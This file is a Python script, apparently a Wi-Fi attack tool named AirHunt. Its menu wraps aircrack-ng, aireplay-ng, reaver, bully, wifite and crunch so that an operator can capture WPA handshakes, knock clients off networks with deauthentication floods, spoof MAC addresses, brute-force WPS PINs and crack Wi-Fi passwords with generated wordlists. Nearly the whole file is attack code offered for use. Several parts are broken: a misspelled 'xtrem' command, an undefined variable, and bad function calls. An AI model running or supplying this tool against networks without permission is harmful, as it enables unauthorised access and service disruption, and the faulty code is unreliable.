############################################
#author : Debajyoti0-0                     #
#version: 1.0.0                            #                                
#Github : https://github.com/Debajyoti0-0/ #
############################################

# coding: utf-8
#!/usr/bin/env python
import os
import subprocess
import time

# Color codes for text
class TextColor:
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    BLUE = "\033[1;34m"
    CYAN = "\033[1;36m"
    YELLOW = "\033[1;33m"
    RESET = "\033[0m"
    PURPLE = "\033[1;35m"

# Color codes for user input fields
class InputColor:
    BOLD = "\033[1m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    RESET = "\033[0m"
    PURPLE = "\033[1;35m"

if os.geteuid() != 0:
    print(f"{TextColor.RED}[X] This script requires root (administrator) privileges. Please run it as root.{TextColor.RESET}")
    exit(1)

os.environ['LC_ALL'] = 'C.UTF-8'
interface_mode = ""

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_network_interfaces():
    interfaces_out = subprocess.check_output(['ifconfig']).decode('utf-8')
    interfaces = [line.split(":")[0].strip() for line in interfaces_out.split("\n") if ": flags=" in line and "lo:" not in line]
    return interfaces

def get_interface_mode(interface):
    try:
        mode_result = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True)
        mode_line = [line for line in mode_result.stdout.strip().split('\n') if 'type' in line][0]
        mode = mode_line.split("type ")[1]
        return mode
    except Exception as e:
        return "N/A"

def get_mac_address(interface):
    try:
        mac_result = subprocess.run(['ifconfig', interface], capture_output=True, text=True)
        mac_line = [line for line in mac_result.stdout.strip().split('\n') if 'ether' in line][0]
        mac = mac_line.split('ether ')[1].split()[0]
        return mac
    except Exception as e:
        return "N/A"

def mac_randomizer(net_card):
    # Turn off the interface
    os.system(f"ifconfig {net_card} down")

    print()
    mac_to_change = input(f"{InputColor.BOLD}{InputColor.BLUE}[*] Enter MAC address to replace the current one with (Blank Enter to set random Mac):{InputColor.RESET} ")

    try:
        if not mac_to_change:
            # Randomize the MAC address
            os.system(f"macchanger -r {net_card} &> /dev/null")
        else:
            os.system(f"macchanger -m {mac_to_change} {net_card} &> /dev/null")

        print(f"{TextColor.GREEN}[+] MAC address changed successfully{TextColor.RESET}")

        # Activate the interface again
        os.system(f"ifconfig {net_card} up")

    except Exception as e:
        print(f"{TextColor.RED}[ERROR] Could not change MAC: {e}{TextColor.RESET}")
        print(f"{TextColor.YELLOW}[!] Please try again later or check your permissions.{TextColor.RESET}")
        print(f"{TextColor.YELLOW}Press Enter to Continue to the Main Menu...{TextColor.RESET}")
        input()
        intro()
    intro()

def start_monitor_mode(selected_interface):
    order = "airmon-ng start {}".format(selected_interface)
    geny = os.system(order)
    update_interface_mode(selected_interface)

def stop_monitor_mode(selected_interface):
    order = "airmon-ng stop {} ; sudo systemctl restart NetworkManager ; sudo service NetworkManager restart".format(selected_interface)
    geny = os.system(order)
    update_interface_mode(selected_interface)

def update_interface_mode(selected_interface):
    global interface_mode
    interface_mode = get_interface_mode(selected_interface)

def scan_networks(selected_interface):
    order = "xterm -e airodump-ng {} -M".format(selected_interface)
    print(f"{TextColor.CYAN}[*] When Done Press [CTRL+c Or Press q/Q]{TextColor.RESET}")
    cmd = os.system("sleep 3")
    geny = os.system(order)
    cmd = os.system("sleep 3")
    update_interface_mode(selected_interface)

def get_handshake(selected_interface):
    order = "airodump-ng {} -M".format(selected_interface)
    order = f"airodump-ng {selected_interface} -M"
    print(f"{TextColor.CYAN}\n[*] When Done Press [CTRL+c Or Press q/Q]{TextColor.RESET}")
    print(f"{TextColor.CYAN}\n[*] Note: Under Probe, it might capture passwords. So copy them to the wordlist file.")
    print("[*] Don't attack the network if its Data is ZERO (you waste your time)")
    print("[*] you can use 's' to arrange networks{TextColor.RESET}")
    cmd = os.system("sleep 3")
    geny = os.system(order)
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the bssid of the target?{InputColor.RESET}", end=" ")
    bssid = str(input(""))
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the channel of the network?{InputColor.RESET}", end=" ")
    channel = int(input())
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the path of the output file ?{InputColor.RESET}", end=" ")
    path = str(input(""))
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the number of the packets [1-10000] (0 for an unlimited number){InputColor.RESET}", end=" ")
    print("[*] The number of packets depends on the distance between you and the network.")
    dist = int(input())
    order = f"sudo xterm -e airodump-ng {selected_interface} --bssid {bssid} -c {channel} -w {path} | sudo xterm -e aireplay-ng -0 {dist} -a {bssid} {selected_interface}"
    geny = os.system(order)
    return

def deauth_all_clients():
    order = f"airodump-ng {selected_interface} -M"
    print(f"{TextColor.CYAN}\n[*] When Done Press [CTRL+c Or Press q/Q]{TextColor.RESET}")
    cmd = os.system("sleep 3")
    geny = os.system(order)
    target_bssid = input(f"{InputColor.BOLD}{InputColor.BLUE}Enter the BSSID of the target network:{InputColor.RESET} ")

    print(f"{TextColor.GREEN}[+] Starting Deauthentication attack on all clients...{TextColor.RESET}")
    time.sleep(1)

    # Implement the logic for deauthenticating all clients using aireplay-ng
    command = f"sudo xterm -e aireplay-ng -0 0 -a '{target_bssid}' {selected_interface}"
    subprocess.run(command, shell=True)

def deauth_one_client():
    order = f"airodump-ng {selected_interface} -M"
    print(f"{TextColor.CYAN}\n[*] When Done Press [CTRL+c Or Press q/Q]{TextColor.RESET}")
    cmd = os.system("sleep 3")
    geny = os.system(order)
    target_bssid = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the BSSID of the target network:{InputColor.RESET} ")
    client_mac = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the MAC address of the client to deauthenticate:{InputColor.RESET} ")

    print(f"{TextColor.GREEN}[+] Starting Deauthentication attack on one client...{TextColor.RESET}")
    time.sleep(1)

    # Implement the logic for deauthenticating one client using aireplay-ng
    command = f"sudo xterm -e aireplay-ng -0 0 -a '{target_bssid}' -c {client_mac} {selected_interface}"
    subprocess.run(command, shell=True)

def deauth_main():
    while True:
        os.system('clear')
        print("\033[1;35mDeauthentication Attack Options:\033[0m")
        print("1. Deauthenticate all clients")
        print("2. Deauthenticate one client")
        print("0. Back to Main Menu")
        choice = input(f"\n{InputColor.BOLD}{InputColor.BLUE}Choose the right option:{InputColor.RESET} ")

        if choice == "1":
            deauth_all_clients()
            break
        elif choice == "2":
            deauth_one_client()
            break
        elif choice == "0":
            intro()
            break
        else:
            print(f"{TextColor.RED}[!] Invalid choice.{TextColor.RESET}")
            input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")
            os.system('clear')

def crack_handshake_custom(handshake_file_path, wordlist_path):
    order = f"aircrack-ng {handshake_file_path} -w {wordlist_path}"
    geny = os.system(order)
    input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue...{InputColor.RESET}")
    update_interface_mode(selected_interface)

def create_wordlist():
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the minimum length of the password (8/64)?{InputColor.RESET}", end=" ")
    mini = int(input(""))
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the maximum length of the password (8/64)?{InputColor.RESET}", end=" ")
    max = int(input(""))
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the path of the output file?{InputColor.RESET}", end=" ")
    path = str(input(""))
    print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter what you want the password to contain?{InputColor.RESET}", end=" ")
    password = str(input(""))
    order = f"crunch {mini} {max} {password} -o {path}"
    geny = os.system(order)
    a = f"The wordlist in >>>>> {path} Named as START"
    print(a)

def wps_network_attacks(selected_interface):
    cmd = os.system("clear")
    print("""\033[1;35m
1) Reaver
2) Bully
3) wifite (Recommended)
4) PixieWps

0) Back to Main Menu\033[1;35m
""")
    print(f"{InputColor.BOLD}{InputColor.BLUE}[+] Choose the kind of the attack (External WIFI Adapter Required) ?{InputColor.RESET}", end=" ")
    attack = int(input(""))
    if attack == 1:
        print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the bssid of the network ?{InputColor.RESET}", end=" ")
        bssid = str(input(""))
        order = f"reaver -i {selected_interface} -b {bssid} -vv"
        geny = os.system(order)
    elif attack == 2:
        print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the bssid of the network ?{InputColor.RESET}", end=" ")
        bssid = str(input(""))
        print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the channel of the network ?{InputColor.RESET}", end=" ")
        channel = int(input(""))
        order = f"bully -b {bssid} -c {channel} --pixiewps {selected_interface}"
        geny = os.system(order)
    elif attack == 3:
        cmd = os.system("wifite")
    elif attack == 4:
        print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the bssid of the network ?{InputColor.RESET}", end=" ")
        bssid = str(input(""))
        order = f"reaver -i {selected_interface} -b {bssid} -K"
        geny = os.system(order)
    elif attack == 0:
        intro()
    else:
        print(f"{TextColor.RED}[!] Not Found.{TextColor.RESET}")

def scan_for_wps_networks(selected_interface):
    order = "airodump-ng -M --wps {}".format(selected_interface)
    geny = os.system(order)
    cmd = os.system("sleep 5 ")
    update_interface_mode(selected_interface)

def intro():
    clear_screen()
    print(TextColor.PURPLE + """
   .               .    
 .´  ·  .     .  ·  `.   █████╗ ██╗██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
 :  :  :  (¯)  :  :  :  ██╔══██╗██║██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝
 `.  ·  ` /¯\ ´  ·  .´  ███████║██║██████╔╝███████║██║   ██║██╔██╗ ██║   ██║
   `     /¯¯¯\     ´    ██╔══██║██║██╔══██╗██╔══██║██║   ██║██║╚██╗██║   ██║
        /¯¯¯¯¯\         ██║  ██║██║██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║
       /¯¯¯¯¯¯¯\        ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝ 
""" + TextColor.RED + """ 

author : Debajyoti0-0
version: 1.0.0                                                            
Github : https://github.com/Debajyoti0-0/""" + TextColor.RESET)

    print(f"{TextColor.GREEN}--------------------------------------------------------------------------------{TextColor.RESET}")
    print(f"{TextColor.BLUE}[+] Interface mode:{TextColor.RESET}             {interface_mode}")
    print(f"{TextColor.BLUE}[+] Interface name:{TextColor.RESET}             {selected_interface}")
    print(f"{TextColor.BLUE}[+] MAC address:{TextColor.RESET}                {mac_address}")
    print("\n(1) Start monitor mode")
    print("(2) Stop monitor mode")
    print("(3) Scan Networks")
    print("(4) Capturing Handshake")
    print("(5) Deauthentication Attack")
    print("(6) MAC Address Randomizer")
    print("(7) Crack Handshake with wordlist")
    print("(8) Crack Handshake without wordlist (Handshake, BSSID needed)")
    print("(9) Create wordlist")
    print("(10) WPS Networks attacks")
    print("(11) Scan for WPS Networks")
    print("(0) Exit")
    print("--------------------------------------------------------------------------------")
    print(f"[{TextColor.YELLOW}NOTE: Press Enter to Reselect Interface.{TextColor.RESET}]\n")

    var = int(input(TextColor.CYAN + "[?] Enter your choice here: " + TextColor.RESET))
    if var == 1:
        start_monitor_mode(selected_interface)
    elif var == 2:
        stop_monitor_mode(selected_interface)
    elif var == 3:
        scan_networks(selected_interface)
    elif var == 4:
        get_handshake(selected_interface)
    elif var == 5:
        deauth_main()
    elif var == 6:
        mac_randomizer(selected_interface)
        intro(selected_interface, interface_mode, mac_address)
    elif var == 7:
        print(TextColor.YELLOW + "\n[?] Enter the path of the handshake file ?" + TextColor.RESET)
        path = str(input(""))
        print(TextColor.YELLOW + "\n[?] Enter the path of the wordlist ?" + TextColor.RESET)
        wordlist = str(input(""))
        crack_handshake_custom(path, wordlist)
    elif var == 8:
        print(TextColor.YELLOW + "\n[?] Enter the BSSID of the network:" + TextColor.RESET)
        bssid = str(input(""))
        print(TextColor.YELLOW + "\n[?] Enter the path of the handshake file?" + TextColor.RESET)
        path = str(input(""))
        print(TextColor.YELLOW + "\n[?] Enter the minimum length of the password (8/64)?" + TextColor.RESET)
        mini = int(input(""))
        print(TextColor.YELLOW + "\n[?] Enter the maximum length of the password (8/64)?" + TextColor.RESET)
        max = int(input(""))
        print(TextColor.CYAN + """
---------------------------------------------------------------------------------------
(1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
(2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
(3)  Numeric chars                                   (0123456789)
(4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
(5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
(6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
(7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
(9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
(10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
(11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
(12) Your Own Words and numbers
-----------------------------------------------------------------------------------------
""" + TextColor.RESET)
        print(TextColor.YELLOW + "\n[?] Enter your choice here : ?" + TextColor.RESET)
        set = str(input(""))
        if set == "1":
            test = str("abcdefghijklmnopqrstuvwxyz")
        elif set == "2":
            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        elif set == "3":
            test = str("0123456789")
        elif set == "4":
            test = str("!#$%/=?{}[]-*:;")
        elif set == "5":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
        elif set == "6":
            test = str("abcdefghijklmnopqrstuvwxyz0123456789")
        elif set == "7":
            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        elif set == "8":
            test = str("!#$%/=?{}[]-*:;0123456789")
        elif set == "9":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        elif set == "10":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;")
        elif set == "11":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
        elif set == "12":
            print(TextColor.YELLOW + "\n[?] Enter your custom characters?" + TextColor.RESET)
            test = str(input(""))
        order = ("sudo xterm -e crunch {} {} {} | sudo xtrem -e aircrack-ng {} -b {} -w-").format(min, max, test, path, bssid)
        geny = os.system(order)
        input(TextColor.CYAN + "Press Enter to Continue..." + TextColor.RESET)
    elif var == 9:
        create_wordlist()
    elif var == 10:
        wps_network_attacks(selected_interface)
    elif var == 11:
        scan_for_wps_networks(selected_interface)
    elif var == 0:
        print(TextColor.YELLOW + "[^] Exiting the program..Goodbye! 👋" + TextColor.YELLOW)
        exit()
    else:
        print(TextColor.RED + "[!] Please Enter a Correct Value" + TextColor.RESET)
    intro()

if __name__ == "__main__":
    # Get available network interfaces
    network_interfaces = get_network_interfaces()

    while True:
    # Choose a network interface
        os.system('clear')
        print(TextColor.PURPLE + """
   .               .    
 .´  ·  .     .  ·  `.   █████╗ ██╗██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
 :  :  :  (¯)  :  :  :  ██╔══██╗██║██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝
 `.  ·  ` /¯\ ´  ·  .´  ███████║██║██████╔╝███████║██║   ██║██╔██╗ ██║   ██║
   `     /¯¯¯\     ´    ██╔══██║██║██╔══██╗██╔══██║██║   ██║██║╚██╗██║   ██║
        /¯¯¯¯¯\         ██║  ██║██║██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║
       /¯¯¯¯¯¯¯\        ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝ 
""" + TextColor.RED + """ 

author : Debajyoti0-0
version: 1.0.0                                                            
Github : https://github.com/Debajyoti0-0/""" + TextColor.RESET)

        print(f"{TextColor.GREEN}--------------------------------------------------------------------------------{TextColor.RESET}")
        print(f"{TextColor.CYAN}\n[+] Available network interfaces:{TextColor.RESET}")
        for i, interface in enumerate(network_interfaces):
            print(f"{TextColor.CYAN}\t{i + 1}) {interface}{TextColor.RESET}")

        if not network_interfaces:
            print(f"{TextColor.RED}[!] No Available network interfaces..{TextColor.RESET}")
            break

        try:
            choice = int(input("\033[1;36m\n[?] Choose the number of the interface to use: \033[0m")) - 1

            if 0 <= choice < len(network_interfaces):
                selected_interface = network_interfaces[choice]
                update_interface_mode(selected_interface)
                mac_address = get_mac_address(selected_interface)
                intro()
                break
            else:
                print(f"{TextColor.RED}[!] Invalid choice.{TextColor.RESET}")
                input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")
                os.system('clear')
        except ValueError:
            print(f"{TextColor.RED}[!] Invalid input. Please enter a number corresponding to the interface.{TextColor.RESET}")